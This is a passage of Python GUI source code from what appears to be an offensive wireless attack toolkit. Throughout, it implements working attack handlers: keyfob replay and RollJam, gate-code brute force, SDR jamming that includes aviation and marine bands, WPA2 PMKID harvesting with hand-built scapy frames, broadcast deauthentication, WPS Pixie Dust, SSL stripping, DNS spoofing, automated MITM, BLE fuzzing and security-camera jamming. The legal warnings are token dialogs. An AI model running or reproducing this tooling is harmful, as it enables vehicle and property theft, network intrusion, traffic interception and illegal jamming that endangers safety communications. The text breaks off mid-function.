            {'name': 'Amateur 70cm (420-450)', 'freq': 435.00, 'category': 'amateur'},
            
            # === RC Toys & Drones ===
            {'name': 'RC Toy (27 MHz)', 'freq': 27.00, 'category': 'rc'},
            {'name': 'RC Toy (49 MHz)', 'freq': 49.00, 'category': 'rc'},
            {'name': 'RC (72 MHz)', 'freq': 72.00, 'category': 'rc'},
            {'name': 'Drone (2.4 GHz)', 'freq': 2412.00, 'category': 'drone'},
            {'name': 'Drone (5.8 GHz)', 'freq': 5800.00, 'category': 'drone'},
            
            # === Baby Monitors ===
            {'name': 'Baby Monitor (433.92)', 'freq': 433.92, 'category': 'iot'},
            {'name': 'Baby Monitor (2.4 GHz)', 'freq': 2437.00, 'category': 'iot'},
            
            # === Miscellaneous ===
            {'name': 'Keyfob (310)', 'freq': 310.00, 'category': 'car'},
            {'name': 'Alarm (433.92)', 'freq': 433.92, 'category': 'iot'},
            {'name': 'Alarm (868)', 'freq': 868.00, 'category': 'iot'},
            
            # === LoRa ===
            {'name': 'LoRa (US 915)', 'freq': 915.00, 'category': 'iot'},
            {'name': 'LoRa (EU 868)', 'freq': 868.00, 'category': 'iot'},
            {'name': 'LoRa (Asia 433)', 'freq': 433.00, 'category': 'iot'},
            
            # === FRS/GMRS ===
            {'name': 'FRS/GMRS (462-467)', 'freq': 462.00, 'category': 'frs'},
        ]

    def _on_preset_select(self, event):
        """Handle preset selection - update attack types dynamically"""
        name = self.preset_var.get()
        # Find preset and update available attacks
        for p in self._get_presets_list():
            if p['name'] == name:
                category = p.get('category', 'iot')
                
                # Update attack type options based on category
                if category == 'car':
                    self.attack_type_combo['values'] = ['Replay', 'RollJam', 'Brute Force', 'Jam', 'Monitor']
                elif category == 'iot':
                    self.attack_type_combo['values'] = ['Replay', 'Monitor', 'Jam']
                elif category in ['public_safety', 'aviation', 'marine', 'amateur', 'frs']:
                    self.attack_type_combo['values'] = ['Monitor', 'Record', 'Jam']
                elif category == 'drone':
                    self.attack_type_combo['values'] = ['Monitor', 'Jam']
                elif category == 'rc':
                    self.attack_type_combo['values'] = ['Replay', 'Monitor']
                else:
                    self.attack_type_combo['values'] = ['Monitor', 'Replay', 'Jam']
                
                self.attack_type_var.set(self.attack_type_combo['values'][0])
                self._log_attack_status(f"Selected: {name} - {p['freq']} MHz")
                break
    
    def _execute_attack(self):
        """Execute selected attack type on selected preset"""
        preset_name = self.preset_var.get()
        attack_type = self.attack_type_var.get()
        
        if not preset_name:
            messagebox.showwarning("No Preset", "Please select a frequency preset first.")
            return
        
        # Find the preset
        preset = None
        for p in self._get_presets_list():
            if p['name'] == preset_name:
                preset = p
                break
        
        if not preset:
            messagebox.showerror("Error", "Invalid preset selected")
            return
        
        freq = preset['freq']
        category = preset.get('category', 'iot')
        
        # Legal Warning for Illegal Operations
        if category in ['public_safety', 'aviation', 'marine'] and attack_type in ['Jam', 'Transmit']:
            result = messagebox.askokcancel(
                "LEGAL WARNING",
                f"⚠️ WARNING: Jamming {category.upper()} frequencies is ILLEGAL and punishable by law.\n\n"
                f"This is for EDUCATIONAL purposes only. Proceed at your own risk."
            )
            if not result:
                return
        
        # Execute Attack
        self._log_attack_status(f"\n⚡ EXECUTING: {attack_type} on {preset_name} ({freq} MHz)")
        
        try:
            if attack_type == 'Replay':
                self._attack_replay(freq, preset_name)
            elif attack_type == 'RollJam':
                self._attack_rolljam(freq, preset_name)
            elif attack_type == 'Brute Force':
                self._attack_brute_force(freq, preset_name)
            elif attack_type == 'Jam':
                self._attack_jam(freq, preset_name)
            elif attack_type == 'Monitor':
                self._attack_monitor(freq, preset_name)
            elif attack_type == 'Record':
                self._attack_record(freq, preset_name)
            else:
                messagebox.showerror("Error", f"Attack type '{attack_type}' not implemented")
        except Exception as e:
            messagebox.showerror("Attack Failed", f"Error: {e}")
            self._log_attack_status(f"❌ Attack Failed: {e}")
    
    # Individual Attack Implementations
    def _attack_replay(self, freq, preset_name):
        """Simple Replay Attack"""
        self._stop_active_engines(except_module='replay')
        self._log_attack_status(f"[Replay] Listening on {freq} MHz for 5 seconds...")
        if self.subghz and self.subghz.sdr:
            # Record for 5 seconds
            import time
            fname = f"captures/quick_capture_{int(time.time())}.cs16"
            self.subghz.sdr.record_signal(fname, duration=5.0, freq=freq*1e6, sample_rate=2e6)
            self._log_attack_status(f"[Replay] Captured to {fname}")
            
            # Replay immediately
            time.sleep(0.5)
            self._log_attack_status(f"[Replay] Transmitting...")
            self.subghz.sdr.replay_signal(fname, freq=freq*1e6, sample_rate=2e6)
            self._log_attack_status(f"✅ [Replay] Complete")
            messagebox.showinfo("Replay", "Signal captured and replayed successfully")
        else:
            messagebox.showerror("Error", "SDR not available")
    
    def _attack_rolljam(self, freq, preset_name):
        """RollJam Attack (Advanced)"""
        self._stop_active_engines(except_module='rolljam')
        self._log_attack_status(f"[RollJam] Starting on {freq} MHz...")
        messagebox.showinfo("RollJam", 
            f"RollJam Attack Initiated on {freq} MHz\n\n"
            f"1. Jamming frequency\n"
            f"2. Waiting for 2x button presses\n"
            f"3. Will capture both codes\n\n"
            f"Press OK to start (requires 2x physical button presses)")
        
        # Launch RollJam via orchestrator
        from modules.attacks.rolling_code_attack import RollingCodeAttack
        try:
            attacker = RollingCodeAttack(self.subghz.sdr, self.scanner_modules.get('recorder'))
            codes = attacker.perform_attack(freq*1e6)
            if codes:
                self._log_attack_status(f"✅ [RollJam] Captured {len(codes)} rolling codes")
                messagebox.showinfo("Success", f"Captured {len(codes)} rolling codes!")
            else:
                self._log_attack_status(f"❌ [RollJam] No codes captured")
        except Exception as e:
            self._log_attack_status(f"❌ [RollJam] Error: {e}")
    
    def _attack_brute_force(self, freq, preset_name):
        """Brute Force Attack - Full Implementation"""
        self._stop_active_engines(except_module='bruteforce')
        from modules.bruteforce_orchestrator import BruteForceOrchestrator
        
        # Advanced options dialog
        result = messagebox.askokcancel(
            "Brute Force Attack",
            f"🔓 Brute force {preset_name} ({freq} MHz)?\n\n"
            f"Protocol: Nice Flo-R (12-bit rolling codes)\n"
            f"Code Range: 0 - 4095 (4096 codes total)\n"
            f"Estimated Time: ~8-12 minutes\n\n"
            f"⚠️ WARNING: This will jam the target frequency during transmission.\n"
            f"The attack will run in background and can be stopped anytime.\n\n"
            f"Continue?"
        )
        
        if not result:
            return
        
        # Ask for code range customization
        start_code = simpledialog.askinteger(
            "Start Code", 
            "Enter starting code (0-4095):",
            initialvalue=0,
            minvalue=0,
            maxvalue=4095
        )
        
        if start_code is None:
            return
        
        end_code = simpledialog.askinteger(
            "End Code",
            "Enter ending code (0-4095):",
            initialvalue=4095,
            minvalue=start_code,
            maxvalue=4095
        )
        
        if end_code is None:
            return
        
        total_codes = end_code - start_code + 1
        estimated_time = int(total_codes * 0.15)  # ~150ms per code
        
        # Final confirmation
        confirm = messagebox.askyesno(
            "Confirm Brute Force",
            f"Ready to transmit:\n\n"
            f"Frequency: {freq} MHz\n"
            f"Code Range: {start_code} - {end_code}\n"
            f"Total Codes: {total_codes}\n"
            f"Estimated Time: ~{estimated_time} seconds\n\n"
            f"Start attack?"
        )
        
        if not confirm:
            return
        
        # Launch attack in background thread
        def brute_force_thread():
            try:
                self._log_attack_status(f"🔓 [Brute Force] Starting attack on {freq} MHz...")
                self._log_attack_status(f"[Brute Force] Range: {start_code} - {end_code} ({total_codes} codes)")
                
                # Create orchestrator
                orchestrator = BruteForceOrchestrator(
                    sdr=self.subghz.sdr if self.subghz else None,
                    scanner=self.subghz if hasattr(self, 'subghz') else None
                )
                
                # Override frequency
                orchestrator.freq_hz = freq * 1e6
                
                # Store reference for stop button
                self.active_brute_force = orchestrator
                
                # Start attack
                orchestrator.start_attack(start_code=start_code, end_code=end_code)
                
                # Attack complete
                self._log_attack_status(f"✅ [Brute Force] Attack complete! Transmitted {total_codes} codes.")
                messagebox.showinfo(
                    "Brute Force Complete",
                    f"Successfully transmitted all {total_codes} codes.\n\n"
                    f"Check captures/subghz/captured_codes.jsonl for log."
                )
                
            except Exception as e:
                self._log_attack_status(f"❌ [Brute Force] Error: {e}")
                messagebox.showerror("Brute Force Failed", f"Attack failed: {e}")
            finally:
                self.active_brute_force = None
        
        threading.Thread(target=brute_force_thread, daemon=True).start()
        
        # Show status
        messagebox.showinfo(
            "Brute Force Started",
            f"Attack running in background.\n\n"
            f"Watch the RF Status console for progress.\n"
            f"Estimated completion: ~{estimated_time} seconds"
        )
    
    def _attack_jam(self, freq, preset_name):
        """Jamming Attack"""
        self._stop_active_engines(except_module='jam')
        self._log_attack_status(f"[Jam] Starting broadband noise on {freq} MHz...")
        if self.subghz and self.subghz.sdr:
            self.subghz.sdr.start_jamming(freq*1e6)
            messagebox.showinfo("Jamming", f"Jamming {freq} MHz\n\nClick 'STOP JAMMING' button to stop.")
            self.btn_jam.config(text="STOP JAMMING", bg='#000')
        else:
            messagebox.showerror("Error", "SDR not available")
    
    def _attack_monitor(self, freq, preset_name):
        """Monitor Mode (Passive Listening)"""
        self._stop_active_engines(except_module='monitor')
        self._log_attack_status(f"[Monitor] Listening on {freq} MHz (Passive Mode)...")
        if self.subghz:
            self.subghz.frequencies = [freq * 1e6]
            self.subghz.enable_scanning(True)
            messagebox.showinfo("Monitor", f"Now monitoring {freq} MHz\n\nSignals will appear in recordings tab.")
        else:
            messagebox.showerror("Error", "Scanner not available")
    
    def _attack_record(self, freq, preset_name):
        """Burst Recording (Autonomous)"""
        self._stop_active_engines(except_module='record')
        # Check if already recording
        duration = 30  # 30 seconds default
        result = simpledialog.askinteger("Record Duration", f"Record {freq} MHz for how many seconds?", initialvalue=30, minvalue=5, maxvalue=300)
        if result:
            duration = result
            import time
            fname = f"captures/recording_{preset_name.replace(' ', '_')}_{int(time.time())}.cs16"
            self._log_attack_status(f"[Record] Recording {freq} MHz for {duration}s to {fname}...")
            if self.subghz and self.subghz.sdr:
                self.subghz.sdr.record_signal(fname, duration=float(duration), freq=freq*1e6, sample_rate=2e6)
                self._log_attack_status(f"✅ [Record] Complete: {fname}")
                messagebox.showinfo("Recording", f"Saved to:\n{fname}")
            else:
                messagebox.showerror("Error", "SDR not available")
    
    def _stop_active_engines(self, except_module=None):
        """Stop all autonomous or conflicting SDR tasks"""
        if hasattr(self, 'auto_subghz') and self.auto_subghz.running and except_module != 'auto_subghz':
            self._log_attack_status("🛡️ Stopping Autonomous Jam-and-Record...")
            self._toggle_auto_subghz()
            
        if hasattr(self, 'auto_rolljam') and self.auto_rolljam.running and except_module != 'auto_rolljam':
            self._log_attack_status("🛡️ Stopping Auto-RollJam...")
            self._toggle_auto_rolljam()
            
        if self.subghz and self.subghz.scanning_active and except_module != 'monitor':
             self._log_attack_status("🛡️ Pausing passive monitor...")
             self.subghz.stop()
             if hasattr(self, 'btn_toggle_monitor'):
                 self.btn_toggle_monitor.config(text="▶ MONITOR", bg='#3B82F6')

    def _toggle_audio_listen(self):
        """Toggle audio listening"""
        # Stop conflicting tasks
        self._stop_active_engines(except_module='audio')

        if not hasattr(self, 'audio_demod') or not self.audio_demod or not hasattr(self.audio_demod, 'running'):
            # Initialize audio demodulator
            from modules.audio_demodulator import AudioDemodulator
            try:
                modulation = self.audio_mod_var.get()
                self.audio_demod = AudioDemodulator(self.subghz.sdr, modulation=modulation)
                self.audio_demod.squelch = self.audio_squelch_var.get()
                self.audio_demod.auto_fine_tune = self.audio_autoseek_var.get()
            except Exception as e:
                messagebox.showerror("Audio Init Failed", f"Error: {e}\n\nMake sure PyAudio is installed:\npip install pyaudio")
                self.audio_demod = None
                return
        
        btn_text = self.btn_listen.cget('text')
        if "LISTEN" in btn_text:
            # Get frequency from preset or manual entry
            preset_name = self.preset_var.get()
            if preset_name:
                # Find frequency from preset
                freq = None
                for p in self._get_presets_list():
                    if p['name'] == preset_name:
                        freq = p['freq'] * 1e6
                        break
                
                if freq:
                    # Update modulation if changed
                    self.audio_demod.modulation = self.audio_mod_var.get()
                    
                    # Start listening
                    if self.audio_demod.start_listening(freq):
                        self.btn_listen.config(text="⏹ STOP", bg='#DC2626')
                        self.audio_freq_label.config(text=f"Freq: {freq/1e6:.2f} MHz")
                        self._log_attack_status(f"🔊 [Audio] Listening on {freq/1e6} MHz ({self.audio_demod.modulation})")
                        # Start UI update loop for audio
                        self._update_audio_status()
                    else:
                        messagebox.showerror("Error", "Failed to start audio demodulator")
                else:
                    messagebox.showerror("Error", "Invalid preset selected")
            else:
                messagebox.showwarning("No Preset", "Please select a frequency preset first")
        else:
            # Stop listening
            if self.audio_demod:
                self.audio_demod.stop_listening()
            self.btn_listen.config(text="🔊 LISTEN", bg='#10B981')
            self.audio_freq_label.config(text="Freq: --.-")
            self.audio_peak_label.config(text="Peak: --.-")
            self.audio_rssi_bar['value'] = 0
            self._log_attack_status("🔊 [Audio] Listening stopped")
    
    def _on_volume_change(self, value):
        """Update audio volume"""
        if hasattr(self, 'audio_demod') and self.audio_demod:
            self.audio_demod.set_volume(float(value) / 100.0)

    def _on_squelch_change(self, value):
        """Update audio squelch threshold"""
        if hasattr(self, 'audio_demod') and self.audio_demod:
            self.audio_demod.squelch = float(value)

    def _update_audio_status(self):
        """Periodically update RSSI and Peak frequency in UI"""
        if not hasattr(self, 'audio_demod') or not self.audio_demod or not self.audio_demod.running:
            return
            
        # Update peak freq
        if self.audio_demod.actual_freq > 0:
            self.audio_peak_label.config(text=f"Peak: {self.audio_demod.actual_freq/1e6:.3f} MHz")
            
        # Update RSSI bar (Normalize -100 to 0 to 0-100%)
        pwr = self.audio_demod.rssi_smoothed
        val = max(0, min(100, (pwr + 100))) # -100dBm -> 0%, 0dBm -> 100%
        self.audio_rssi_bar['value'] = val
        
        # Color based on signal
        if pwr > self.audio_demod.squelch:
            self.audio_rssi_bar.config(style="Green.Horizontal.TProgressbar")
        else:
            self.audio_rssi_bar.config(style="TProgressbar")
            
        # Schedule next update (100ms for responsiveness)
        self.root.after(100, self._update_audio_status)

    def _on_autoseek_toggle(self):
        """Handle Auto-Seek toggle"""
        if self.audio_demod:
            self.audio_demod.auto_fine_tune = self.audio_autoseek_var.get()

    def _toggle_audio_scan(self):
        """Toggle band-wide frequency scanning"""
        if not hasattr(self, 'audio_scanning'):
             self.audio_scanning = False
             
        if not self.audio_scanning:
            preset_name = self.preset_var.get()
            if not preset_name:
                messagebox.showerror("Error", "Please select a category to scan")
                return
                
            self.audio_scanning = True
            self.btn_audio_scan.config(text="⏹ STOP SCAN", bg='#DC2626')
            self._log_attack_status(f"📡 [Scan] Starting wideband scan for {preset_name}...")
            
            # Start listener if not running
            if not hasattr(self, 'audio_demod') or not self.audio_demod or not self.audio_demod.running:
                self._toggle_audio_listen()
                
            # Start scan loop
            self._step_scan_loop()
        else:
            self.audio_scanning = False
            self.btn_audio_scan.config(text="📡 SCAN BAND", bg='#3B82F6')
            self._log_attack_status("📡 [Scan] Stopped")

    def _step_scan_loop(self):
        """Hop through frequencies in the category until signal found"""
        if not self.audio_scanning or not self.audio_demod or not self.audio_demod.running:
            return

        # If we currently have a signal above squelch, stay here for a bit
        if self.audio_demod.rssi_smoothed > self.audio_demod.squelch:
            # Signal found! Stay and listen.
            self.root.after(2000, self._step_scan_loop) # Check again in 2s
            return

        # No signal, hop to next frequency in category
        presets = self._get_presets_list()
        preset_name = self.preset_var.get()
        
        # Find all frequencies in this category
        cat_freqs = []
        # Find current category
        current_cat = None
        for p in presets:
            if p['name'] == preset_name:
                current_cat = p.get('category')
                break
        
        if not current_cat:
            cat_freqs = [p['freq'] for p in presets] # Fallback to all
        else:
            cat_freqs = [p['freq'] for p in presets if p.get('category') == current_cat]

        # Find current index or pick first
        current_f = self.audio_demod.sdr.device.config.frequency / 1e6
        try:
            next_idx = (cat_freqs.index(current_f) + 1) % len(cat_freqs)
        except ValueError:
            next_idx = 0
            
        next_f = cat_freqs[next_idx]
        self._log_attack_status(f"📡 [Scan] Hopping to {next_f} MHz...")
        
        # Tune SDR (Internal method handles state)
        self.audio_demod.sdr.set_frequency(next_f * 1e6)
        self.audio_freq_label.config(text=f"Freq: {next_f:.2f} MHz")
        
        # Allow time to settle and check RSSI
        self.root.after(1000, self._step_scan_loop)

    def _toggle_auto_mitm(self):
        """Toggle Autonomous MITM Engine"""
        if not self.auto_mitm: return
        
        if not self.auto_mitm.running:
            self.auto_mitm.start()
            self.btn_auto_mitm.config(text="ON", bg='#10B981')
            self._log_attack_status("Auto-MITM: ENGAGED - Scanning for targets")
        else:
            self.auto_mitm.stop()
            self.btn_auto_mitm.config(text="OFF", bg='#334155')
            self._log_attack_status("Auto-MITM: DISENGAGED")

    def _toggle_auto_handshake(self):
        """Toggle Autonomous Handshake Engine"""
        if not self.auto_handshake: return
        
        if not self.auto_handshake.running:
            self.auto_handshake.start()
            self.btn_auto_handshake.config(text="ON", bg='#10B981')
            self._log_attack_status("Auto-Handshake: ENGAGED - Harvesting PMKIDs")
        else:
            self.auto_handshake.stop()
            self.btn_auto_handshake.config(text="OFF", bg='#334155')
            self._log_attack_status("Auto-Handshake: DISENGAGED")

    def _toggle_ssl_strip_explicit(self):
        """Explicitly toggle SSL Strip (independent of Auto-MITM)"""
        if not self.ssl_strip_engine: return
        
        if not self.ssl_strip_engine.running:
            self.ssl_strip_engine.start()
            self._log_attack_status("SSL Strip: ACTIVE")
        else:
            self.ssl_strip_engine.stop()
            self._log_attack_status("SSL Strip: STOPPED")

    def _attack_pmkid(self):
        """Launch PMKID attack on all WPA2 networks"""
        if not self.wifi_monitor:
            messagebox.showerror("Error", "WiFi monitor not initialized")
            return
            
        # Get WPA2 APs
        wpa2_aps = [d for d in self.registry.get_active() 
                   if d.protocol == Protocol.WiFi 
                   and d.device_type == DeviceType.AccessPoint
                   and 'WPA2' in getattr(d, 'encryption', '')]
        
        if not wpa2_aps:
            messagebox.showwarning("No Targets", "No WPA2 networks found. Start scanning first.")
            return
        
        count = len(wpa2_aps)
        result = messagebox.askyesno("PMKID Attack", 
                                     f"Send PMKID probe requests to {count} WPA2 networks?\nHashes will be saved to pmkid_hashes.22000")
        if not result:
            return
            
        def run_pmkid():
            from scapy.all import Dot11, Dot11AssoReq, Dot11Elt, RadioTap, sendp, sniff
            
            iface = self.wifi_monitor.interface
            
            # Initialize PMKID attack engine  
            pmkid_engine = self.pmkid_engine
            pmkid_engine.output_file = "pmkid_hashes.22000"
            
            for ap in wpa2_aps:
                bssid = ap.mac_address
                essid = ap.name or "Unknown"
                
                if not bssid:
                    continue
                    
                try:
                    # Our MAC (use monitor interface MAC or random)
                    our_mac = "02:00:00:00:00:01"
                    
                    # Build Association Request with RSN IE requesting PMKID
                    rsn_ie = Dot11Elt(ID=48, info=(
                        b'\x01\x00'  # RSN Version
                        b'\x00\x0f\xac\x04'  # Group Cipher Suite (CCMP)
                        b'\x01\x00'  # Pairwise Cipher Suite Count
                        b'\x00\x0f\xac\x04'  # Pairwise Cipher Suite (CCMP)
                        b'\x01\x00'  # AKM Suite Count
                        b'\x00\x0f\xac\x02'  # AKM Suite (PSK)
                        b'\x00\x00'  # RSN Capabilities
                    ))
                    
                    ssid_ie = Dot11Elt(ID=0, info=essid.encode())
                    
                    assoc_req = RadioTap() / Dot11(
                        addr1=bssid,     # Destination (AP)
                        addr2=our_mac,   # Source (us)
                        addr3=bssid      # BSSID
                    ) / Dot11AssoReq(
                        cap=0x1100,
                        listen_interval=10
                    ) / ssid_ie / rsn_ie
                    
                    print(f"[PMKID] Attacking {essid} ({bssid})")
                    
                    # Send association request
                    sendp(assoc_req, iface=iface, verbose=False)
                    
                    # Sniff for association response with PMKID (timeout 2s)
                    def process_response(pkt):
                        pmkid_engine.process_packet(pkt)
                    
                    sniff(iface=iface, prn=process_response, timeout=2, 
                          lfilter=lambda p: p.haslayer(Dot11) and p.addr2 == bssid)
                    
                except Exception as e:
                    print(f"[PMKID] Failed for {bssid}: {e}")
                    
            messagebox.showinfo("Complete", f"PMKID attack completed on {count} networks.\nCheck pmkid_hashes.22000 for results.")
        
        threading.Thread(target=run_pmkid, daemon=True).start()

    # --- COMPATIBILITY SHIMS ---
    def _refresh_wpa_targets(self): 
        aps = self.registry.get_all()
        # Filter for WiFi protocols
        wifi_protocols = [Protocol.WIFI, Protocol.WIFI_24, Protocol.WIFI_5]
        targets = []
        for d in aps:
            if d.protocol in wifi_protocols:
                ssid = d.metadata.get('ssid', 'Unknown')
                targets.append(f"{ssid} ({d.mac_address or d.device_id})")
        
        self.wpa_target_combo['values'] = targets if targets else ["<No WiFi APs found>"]
        if targets: self.wpa_target_combo.current(0)

    def _refresh_ble_targets(self):
        aps = self.registry.get_all()
        ble_protocols = [Protocol.BLUETOOTH, Protocol.BLUETOOTH_BLE, Protocol.BLUETOOTH_CLASSIC]
        targets = [f"{d.name} ({d.mac_address or d.device_id})" for d in aps if d.protocol in ble_protocols]
        self.ble_target_combo['values'] = targets if targets else ["<No BLE devices found>"]
        if targets: self.ble_target_combo.current(0)
    def _launch_pmkid_targeted(self):
        target = self.wpa_target_combo.get()
        if "(" not in target: return
        bssid = target.split("(")[1].split(")")[0]
        self._log_attack_status(f"Launching PMKID attack on {bssid}...")
        
        interface = self.wifi_monitor.interface if self.wifi_monitor else "wlan0"
        threading.Thread(target=lambda: self.pmkid_engine.run_targeted_attack(bssid, interface), daemon=True).start()

    def _launch_deauth_targeted(self):
        target = self.wpa_target_combo.get()
        if "(" not in target: return
        bssid = target.split("(")[1].split(")")[0]
        self._log_attack_status(f"Sending Deauth to {bssid} and all clients...")
        
        interface = self.wifi_monitor.interface if self.wifi_monitor else "wlan0"
        # Broadcast deauth to force everyone to re-handshake
        threading.Thread(target=lambda: self.wifi_monitor.wpa_capture.send_deauth(bssid, "ff:ff:ff:ff:ff:ff", interface), daemon=True).start()

    def _launch_pixie_dust_targeted(self):
        target = self.wpa_target_combo.get()
        if "(" not in target: return
        ssid = target.split("(")[0].strip()
        bssid = target.split("(")[1].split(")")[0]
        self._log_attack_status(f"Launching Pixie Dust on {ssid} ({bssid})...")
        
        def run():
            pin = self.pixie_engine.start_attack(bssid, ssid)
            if pin:
                self._log_attack_status(f"✅ [PIXIE] PIN RECOVERED: {pin}")
                # Log to Intel Exfil too
                from core.intel_collector import IntelObservation, intel_collector
                obs = IntelObservation(
                    data_type="WPS PIN",
                    value=pin,
                    source_mac=bssid,
                    network=ssid,
                    context="WPS Pixie Dust Attack"
                )
                intel_collector.observations.append(obs)
                intel_collector._notify(obs)
            else:
                self._log_attack_status(f"❌ [PIXIE] Attack failed on {bssid}")
        threading.Thread(target=run, daemon=True).start()

    def _toggle_ssl_strip(self):
        if not self.ssl_strip_engine.running:
            self._log_attack_status("Starting SSL Strip...")
            self.ssl_strip_engine.start()
            self.btn_ssl_strip.config(text="Stop SSL Strip", bg='#EF4444')
        else:
            self.ssl_strip_engine.stop()
            self.btn_ssl_strip.config(text="Start SSL Strip", bg='#10B981')
            self._log_attack_status("SSL Strip stopped.")

    def _jam_replay(self):
        freq = float(self.rf_freq_var.get()) * 1e6
        self._log_attack_status(f"Launching Jam-and-Replay on {freq/1e6} MHz...")
        
        # STOP SCANNER to free HackRF
        if self.subghz:
            self._log_attack_status("[RF] Pausing Sub-GHz scanner...")
            self.subghz.stop()
            time.sleep(1) # Hardware rest
            
        def run():
            try:
                self.rolling_code_engine.start_monitor(freq)
                self._log_attack_status("[RF] Monitoring and jamming... Press button on remote.")
            except Exception as e:
                self._log_attack_status(f"❌ [RF] Attack error: {e}")
                # Restart scanner on failure
                if self.subghz: self.subghz.start()
                
        threading.Thread(target=run, daemon=True).start()

    def _toggle_dns_spoof(self):
        if not self.dns_spoof_engine.running:
            domain = self.dns_target_var.get()
            redirect = self.dns_ip_var.get()
            self._log_attack_status(f"Starting DNS Spoof: {domain} -> {redirect}")
            self.dns_spoof_engine.add_target(domain, redirect)
            self.dns_spoof_engine.start()
            self.btn_dns_spoof.config(text="Stop DNS Spoof")
        else:
            self.dns_spoof_engine.stop()
            self.btn_dns_spoof.config(text="Start DNS Spoof")
            self._log_attack_status("DNS Spoof stopped.")

    def _toggle_auto_handshake(self):
        if self.var_auto_handshake.get():
            self.auto_handshake.start()
            self._log_attack_status("Autonomous Handshake Acquisition STARTED")
        else:
            self.auto_handshake.stop()
            self._log_attack_status("Autonomous Handshake Acquisition STOPPED")

    def _toggle_auto_mitm(self):
        if self.var_auto_mitm.get():
            self.auto_mitm.start()
            self._log_attack_status("Autonomous MITM & SSL Strip STARTED")
        else:
            self.auto_mitm.stop()
            self._log_attack_status("Autonomous MITM & SSL Strip STOPPED")

    def _toggle_auto_subghz(self):
        if self.var_auto_subghz.get():
            self.auto_subghz.start()
            self._log_attack_status("Autonomous Jam-and-Record STARTED")
        else:
            self.auto_subghz.stop()
            self._log_attack_status("Autonomous Jam-and-Record STOPPED")

    def _launch_ble_fuzz(self):
        target = self.ble_target_combo.get()
        if "(" not in target: return
        name = target.split("(")[0].strip()
        mac = target.split("(")[1].split(")")[0]
        self._log_attack_status(f"Launching BLE GATT Fuzz on {name} ({mac})...")
        
        def run():
            if self.ble_fuzzer.connect(mac):
                self.ble_fuzzer.discover_services()
                self.ble_fuzzer.fuzz_all_handles()
                self._log_attack_status(f"[BLE] Fuzzing complete on {mac}")
            else:
                self._log_attack_status(f"❌ [BLE] Failed to connect to {mac}")
        threading.Thread(target=run, daemon=True).start()

    def _launch_sdr_wifi_capture(self):
        """Launch Wi-Fi handshake capture via Monitor Mode Chip (STRICTLY NO SDR)"""
        try:
            channel = int(self.wifi_sdr_ch_entry.get())
            self._log_attack_status(f"WiFi Monitor: Locking to Ch {channel} for handshake capture...")
            
            if self.wifi_monitor:
                 # 1. Lock Channel
                 self.wifi_monitor.lock_channel(channel)
                 
                 # 2. Deauth if target selected
                 target_bssid = "ff:ff:ff:ff:ff:ff" 
                 if self.selected_device:
                     # Check if selected device is WiFi
                     type_check = str(self.selected_device.get('source_type', '')) + str(self.selected_device.get('type', ''))
                     if "WiFi" in type_check or "AP" in type_check or "STATION" in type_check:
                         target_bssid = self.selected_device.get('id')
                         
                 if target_bssid != "ff:ff:ff:ff:ff:ff":
                      self._log_attack_status(f"WiFi Monitor: Sending deauth to {target_bssid}...")
                      if hasattr(self.wifi_monitor, 'wpa_capture'):
                           # Send blocking deauth
                           self.wifi_monitor.wpa_capture.send_deauth(target_bssid, "ff:ff:ff:ff:ff:ff", self.wifi_monitor.interface)
                 else:
                      self._log_attack_status("WiFi Monitor: Listening (Passive)...")

                 # 3. Auto-Resume after 15s
                 self._log_attack_status("WiFi Monitor: Capturing for 15s...")
                 self.root.after(15000, self._resume_monitor_hopping)
            else:
                 self._log_attack_status("❌ WiFi Monitor not initialized")

        except ValueError:
            self._log_attack_status("❌ Invalid Channel")
            
    def _resume_monitor_hopping(self):
        """Resume normal scanning"""
        if self.wifi_monitor:
            self.wifi_monitor.resume_hopping()
            self._log_attack_status("WiFi Monitor: Resumed scanning loops")
    
    # ===== CAMERA TAKEDOWN CALLBACKS =====
    
    def _detect_cameras(self):
        """Start WiFi camera detection"""
        try:
            # Lazy init camera jammer
            if not self.camera_jammer:
                from modules.attacks import CameraJammer
                self.camera_jammer = CameraJammer(
                    sdr_controller=self.subghz.sdr if self.subghz else None,
                    config=self.config
                )
                self.camera_jammer.set_camera_callback(self._on_camera_detected)
            
            self.camera_status_label.config(text="Scanning...", fg='#F59E0B')
            self.btn_detect_cameras.config(state='disabled')
            
            # Run detection in thread
            def detect_thread():
                success = self.camera_jammer.start_camera_detection(duration=30)
                if success:
                    print("[Camera] Detection started (30s)")
                else:
                    print("[Camera] Detection failed to start")
                    self.root.after(0, lambda: self.camera_status_label.config(text="Failed", fg='#DC2626'))
                    self.root.after(0, lambda: self.btn_detect_cameras.config(state='normal'))
            
            threading.Thread(target=detect_thread, daemon=True).start()
            
            # Auto re-enable button after 30s
            self.root.after(31000, self._finish_camera_detection)
            
        except Exception as e:
            print(f"[Camera] Detection error: {e}")
            messagebox.showerror("Error", f"Camera detection failed: {e}")
            self.camera_status_label.config(text="Error", fg='#DC2626')
            self.btn_detect_cameras.config(state='normal')
    
    def _on_camera_detected(self, camera):
        """Callback when camera is detected"""
        # Update GUI (must be in main thread)
        def update_gui():
            # Add to tree
            self.camera_tree.insert('', 'end', values=(
                camera.vendor,
                camera.mac_address,
                camera.channel,
                f"{camera.signal_strength} dBm"
            ))
            self.camera_status_label.config(text=f"Found: {camera.vendor}", fg='#10B981')
        
        self.root.after(0, update_gui)
    
    def _finish_camera_detection(self):
        """Finish camera detection"""
        if self.camera_jammer:
            self.camera_jammer.stop_camera_detection()
        
        count = len(self.camera_tree.get_children())
        self.camera_status_label.config(text=f"Found {count} camera(s)", fg='#10B981')
        self.btn_detect_cameras.config(state='normal')
    
    def _jam_cameras(self):
        """Start camera jamming"""
        try:
            # Confirm with user
            band = self.camera_band_var.get()
            result = messagebox.askokcancel(
                "Camera Jamming",
                f"⚠️ WARNING ⚠️\n\n"
                f"Start WiFi jamming on {band}?\n\n"
                f"This will:\n"
                f"• Disrupt ALL WiFi devices nearby (not just cameras)\n"
                f"• May violate FCC regulations\n"
                f"• Auto-stop after 60 seconds (safety timeout)\n\n"
                f"Only use with explicit authorization!\n\n"
                f"Continue?"
            )
            
            if not result:
                return
            
            # Lazy init if needed
            if not self.camera_jammer:
                from modules.attacks import CameraJammer
                self.camera_jammer = CameraJammer(
                    sdr_controller=self.subghz.sdr if self.subghz else None,
                    config=self.config
                )
            
            # Start jamming in thread
            def jam_thread():
                success = self.camera_jammer.start_jamming(band=band)
                if success:
                    self.root.after(0, lambda: self.camera_status_label.config(
                        text=f"JAMMING {band}", fg='#DC2626'
                    ))
                    print(f"[Camera] Jamming started on {band}")
                else:
                    self.root.after(0, lambda: messagebox.showerror(
                        "Error", "Failed to start camera jamming - check SDR"
